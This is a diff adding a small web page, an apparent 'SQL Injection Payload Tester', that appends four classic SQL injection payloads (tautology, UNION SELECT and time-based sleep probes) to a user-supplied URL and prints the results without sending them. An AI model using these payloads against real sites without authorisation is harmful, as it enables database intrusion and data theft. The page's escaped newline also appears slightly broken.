@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SQLi Scanner</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h2>SQL Injection Payload Tester</h2>
+    <input type="text" id="url" placeholder="URL with param (e.g. ?id=1)" style="width:100%;">
+    <button onclick="scan()">Inject</button>
+    <pre id="output"></pre>
+  </div>
+
+  <script>
+    function scan() {
+      const url = document.getElementById("url").value;
+      const payloads = ["' OR 1=1--", "' OR 'a'='a", "' UNION SELECT NULL--", "' AND sleep(3)--"];
+      let result = "";
+      payloads.forEach(p => {
+        result += url + encodeURIComponent(p) + "\\n";
+      });
+      document.getElementById("output").textContent = result;
+    }
+  </script>
+</body>
+</html>
